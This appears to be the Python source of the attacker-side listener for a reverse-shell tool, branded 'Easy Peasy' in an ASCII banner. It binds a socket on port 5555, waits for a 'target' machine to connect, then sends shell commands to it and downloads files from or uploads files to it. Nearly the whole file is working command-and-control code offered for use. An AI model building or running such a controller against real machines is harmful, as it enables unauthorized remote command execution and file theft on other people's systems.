from colorama import Fore, Back
import time
import sys
import os
from subprocess import call
import socket
import json




print(Fore.YELLOW +'''
	  _______      __    ________  ___  ___        _______   _______      __    ________  ___  ___  
 /"     "|    /""\  ("      "\|"  \/"  |      |   __ "\ /"     "|    /""\  ("      "\|"  \/"  | 
(: ______)   /    \  \___/   :)\   \  /       (. |__) :|: ______)   /    \  \___/   :)\   \  /  
 \/    |    /' /\  \   /  ___/  \\  \/        |:  ____/ \/    |    /' /\  \   /  ___/  \\  \/   
 // ___)_  //  __'  \ //  \__   /   /         (|  /     // ___)_  //  __'  \ //  \__   /   /    
(:      "|/   /  \\  (:   / "\ /   /         /|__/ \   (:      "|/   /  \\  (:   / "\ /   /     
 \_______|___/    \___)_______)___/         (_______)   \_______|___/    \___)_______)___/      
                                                                                                    
                                                                                    - Sudhanshu Patel    ''')

print()
print('Copyright (c) 2021 Sudhanshu Patel under MIT License')
print()
ip = input(Fore.YELLOW + "=>Enter your ip address#~ ")
print(Fore.GREEN + "[+]Squeezing Lemons:")
animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

def write_ip(ip):
	f = open("ip_file.txt", "w")
	f.write(f"{ip}")
	f.close()


for i in range(len(animation)):
    time.sleep(0.2)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()

write_ip(ip)
print("\n")

def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def upload_file(file_name):
        f = open(file_name, 'rb')
        target.send(f.read())


def download_file(file_name):
	f = open(file_name, 'wb')
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()


def target_communication():
	while True:
		command = input('* Shell~%s: ' % str(ip))
		reliable_send(command)
		if command == 'exit':
			break
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
		else:
			result = reliable_recv()
			print(result)
	

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip, 5555))
print(Fore.YELLOW + '[*]Commands-')
print(Fore.YELLOW +'		*cd [filepath] ~ to change directory')
print(Fore.YELLOW +'		*dir ~ to list file in current directory')
print(Fore.YELLOW +'		*download [file_name] ~ to download file from target machine')
print(Fore.YELLOW +'		*upload [file_name] ~ to upload file to target machine')
print(Fore.YELLOW +'		*clear ~ to clear the terminal')
print(Fore.YELLOW +'		*exit ~ to exit')
print('')
print('[+] Waiting for the target#')
sock.listen(5)
target, ip = sock.accept()

print('[+] Target Connected From#~ ' + str(ip))
#Available options
target_communication()
